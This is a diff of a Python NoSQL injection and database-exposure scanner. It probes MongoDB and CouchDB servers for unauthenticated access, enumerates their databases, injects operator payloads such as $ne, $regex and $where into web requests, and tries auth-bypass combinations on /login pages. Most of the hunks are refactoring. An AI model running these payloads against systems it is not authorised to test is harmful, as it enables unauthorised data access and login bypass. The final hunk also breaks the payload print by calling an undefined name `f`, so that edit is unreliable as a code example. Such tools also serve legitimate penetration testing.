@@ -13,6 +13,7 @@ import os
 
 from urllib.parse import urlparse, urlunparse, quote_plus, parse_qsl
 from pymongo import MongoClient, errors as mongo_errors
+from pymongo.errors import ConfigurationError, ServerSelectionTimeoutError
 import couchdb
 import requests
 import validators
@@ -59,19 +60,38 @@ def parse_args():
 def test_db_access(host, port, engine, creds=None):
     if engine == 'mongodb':
         try:
-            opts = {'host': host, 'port': port,
-                    'serverSelectionTimeoutMS': 5000}
+            opts = {
+                'host': host,
+                'port': port,
+                'serverSelectionTimeoutMS': 5000,
+                'connectTimeoutMS': 5000
+            }
             if creds:
                 opts.update(username=creds[0],
-                            password=creds[1], authSource='admin')
+                            password=creds[1],
+                            authSource='admin')
             client = MongoClient(**opts)
             client.admin.command('ping')
             version = client.server_info().get('version', 'unknown')
             return True, version, None
+
+        except ConfigurationError as e:
+            msg = str(e)
+            if 'wire version' in msg:
+                # old server; still reachable
+                return True, '<4.0 (wire mismatch)', None
+            return False, None, msg
+
+        except ServerSelectionTimeoutError as e:
+            return False, None, f'Timeout: {e}'
+
         except mongo_errors.OperationFailure as e:
+            # auth required
             return False, None, str(e)
+
         except Exception as e:
             return False, None, str(e)
+
     else:
         try:
             base = f'http://{host}:{port}/'
@@ -84,21 +104,21 @@ def test_db_access(host, port, engine, creds=None):
 
 
 def detect_mongodb_mgmt(host):
-    ui = f'http://{host}:28017'
+    url = f'http://{host}:28017'
     try:
-        r = requests.get(ui, timeout=5)
+        r = requests.get(url, timeout=5)
         if r.status_code == 200:
-            print(Fore.GREEN + f'[+] MongoDB HTTP UI at {ui}')
+            print(Fore.GREEN + f'[+] MongoDB HTTP UI at {url}')
     except:
         pass
 
 
 def detect_couchdb_ui(host, port):
-    ui = f'http://{host}:{port}/_utils/'
+    url = f'http://{host}:{port}/_utils/'
     try:
-        r = requests.get(ui, timeout=5)
+        r = requests.get(url, timeout=5)
         if r.status_code == 200:
-            print(Fore.GREEN + f'[+] CouchDB Fauxton at {ui}')
+            print(Fore.GREEN + f'[+] CouchDB Fauxton at {url}')
     except:
         pass
 
@@ -113,8 +133,7 @@ def enumerate_mongodb(host, port, creds, csvw=None):
         client = MongoClient(**opts)
         dbs = client.list_database_names()
     except mongo_errors.OperationFailure:
-        print(Fore.YELLOW +
-              '[!] listDatabases needs auth; using common DBs')
+        print(Fore.YELLOW + '[!] listDatabases needs auth; using common DBs')
         dbs = COMMON_MONGO_DBS.copy()
         client = MongoClient(host=host, port=port,
                              serverSelectionTimeoutMS=5000)
@@ -158,20 +177,20 @@ def parse_burp_request(path):
     if not lines or ' ' not in lines[0]:
         raise ValueError('Bad request file')
     method, uri, _ = lines[0].split(' ', 2)
-    headers = {}
+    hdrs = {}
     i = 1
     while i < len(lines) and lines[i]:
         if ':' in lines[i]:
             k, v = lines[i].split(':', 1)
-            headers[k.strip()] = v.strip()
+            hdrs[k.strip()] = v.strip()
         i += 1
     body = '\n'.join(lines[i+1:]) if i+1 < len(lines) else ''
 
     parsed = urlparse(uri)
     if not parsed.scheme:
-        host = headers.get('Host')
+        host = hdrs.get('Host')
         uri = f'https://{host}{uri}'
-    return method.upper(), uri, headers, body
+    return method.upper(), uri, hdrs, body
 
 
 def build_request_line(method, base, inj, data_json):
@@ -185,10 +204,9 @@ def build_request_line(method, base, inj, data_json):
             return (f'curl -X POST {base} '
                     f'-H "Content-Type: application/json" '
                     f'-d "{json.dumps(inj)}"')
-        else:
-            b = '&'.join(f'{quote_plus(str(k))}={quote_plus(str(v))}'
-                         for k, v in inj.items())
-            return f'curl -X POST {base} -d "{b}"'
+        b = '&'.join(f'{quote_plus(str(k))}={quote_plus(str(v))}'
+                     for k, v in inj.items())
+        return f'curl -X POST {base} -d "{b}"'
 
 
 def handle_db(args):
@@ -229,12 +247,12 @@ def handle_db(args):
                       f'{DEFAULT_PORTS[engine]} ({err})')
         if args.output:
             with open(args.output, 'w', newline='') as f:
-                writer = csv.writer(f)
-                writer.writerow(['host', 'version'])
-                writer.writerows(results)
+                w = csv.writer(f)
+                w.writerow(['host', 'version'])
+                w.writerows(results)
         return
 
-    # single host:port
+    # single host
     if ':' in target:
         host, ps = target.split(':', 1)
         try:
@@ -286,10 +304,10 @@ def handle_db(args):
 
 
 def handle_web(args):
-    # 1) Load from Burp or CLI
+    # Load request or CLI
     if args.request:
-        method, full_uri, headers, raw = parse_burp_request(args.request)
-        p = urlparse(full_uri)
+        method, full, headers, raw = parse_burp_request(args.request)
+        p = urlparse(full)
         base = urlunparse((p.scheme, p.netloc, p.path, '', '', ''))
         orig = dict(parse_qsl(p.query, keep_blank_values=True))
         jb, data_json = None, False
@@ -325,23 +343,23 @@ def handle_web(args):
         print(Fore.RED + '[!] Web tests require --url or --request')
         sys.exit(1)
 
-    # 2) Baseline request
+    # Baseline
     try:
         if method == 'GET':
-            baseline = requests.get(base, params=orig, headers=headers, timeout=10)
+            br = requests.get(base, params=orig, headers=headers, timeout=10)
         elif data_json:
-            baseline = requests.post(base, json=jb, headers=headers, timeout=10)
+            br = requests.post(base, json=jb, headers=headers, timeout=10)
         else:
-            baseline = requests.post(base, data=orig, headers=headers, timeout=10)
+            br = requests.post(base, data=orig, headers=headers, timeout=10)
     except Exception as e:
         print(Fore.RED + f'[!] Baseline failed: {e}')
         sys.exit(1)
 
-    blen = len(baseline.text)
+    blen = len(br.text)
     print(Fore.GREEN +
-          f'[+] Baseline: {baseline.status_code} {baseline.reason}, len={blen}')
+          f'[+] Baseline: {br.status_code} {br.reason}, len={blen}')
 
-    # 3) General injection tests
+    # Injection tests
     tests = [
         ('$ne', 'operator $ne', lambda v: v),
         ('$regex', 'operator $regex', lambda _: '^.*$'),
@@ -378,9 +396,7 @@ def handle_web(args):
                         elif op == '$where':
                             p_params[k] = fn(v)
                         else:
-                            p_params[f'{k}[{op}]'] = (
-                                v if op == '$ne' else fn(v)
-                            )
+                            p_params[f'{k}[{op}]'] = (v if op == '$ne' else fn(v))
                     else:
                         if op == '$in':
                             p_params = {f'{k}[$in]': ','.join(fn(v))}
@@ -406,7 +422,6 @@ def handle_web(args):
                 else:
                     p_params = {k: pl}
 
-            # Send injection
             try:
                 if method == 'GET':
                     r = requests.get(base, params=p_params,
@@ -426,8 +441,7 @@ def handle_web(args):
             if vuln:
                 req = r.request
                 print(Fore.GREEN +
-                      f'  [+] {k} ({label}) Δ={delta} '
-                      f'status={r.status_code}')
+                      f'  [+] {k} ({label}) Δ={delta} status={r.status_code}')
                 print(Fore.GREEN + '      --- HTTP REQUEST ---')
                 ln = req.path_url if req.body is None else req.url
                 print(f'      {req.method} {ln} HTTP/1.1')
@@ -450,7 +464,7 @@ def handle_web(args):
             else:
                 print(f'  [-] {k} Δ={delta} status={r.status_code}')
 
-    # 4) Auth-bypass on /login
+    # Auth‐bypass on /login
     parsed_path = urlparse(base).path.lower()
     if method == 'POST' and parsed_path.endswith('/login'):
         print('\n' + Fore.YELLOW + '[*] Testing auth-bypass combos')
@@ -484,14 +498,17 @@ def handle_web(args):
                 send = lambda: requests.post(
                     base, data=params, headers=headers, timeout=20)
             try:
-                resp2 = send()
+                rr = send()
             except Exception as e:
                 print(Fore.RED + f'    [!] auth request error: {e}')
                 continue
-            ok = (resp2.status_code in (200, 302)) and ('Invalid' not in resp2.text)
-            print(Fore.GREEN + f'    -> status={resp2.status_code}, bypass={"yes" if ok else "no"}')
+            ok = (rr.status_code in (200, 302)) and ('Invalid' not in rr.text)
+            print(Fore.GREEN + f'    -> status={rr.status_code}, '
+                               f'bypass={"yes" if ok else "no"}')
             if ok:
-                print(Fore.GREEN + f'      Payload: {json.dumps(payload) if data_json else payload}')
+                print(Fore.GREEN + f
+                              ('      Payload: '
+                               f'{json.dumps(payload) if data_json else payload}'))
 
     # Summary
     if found:
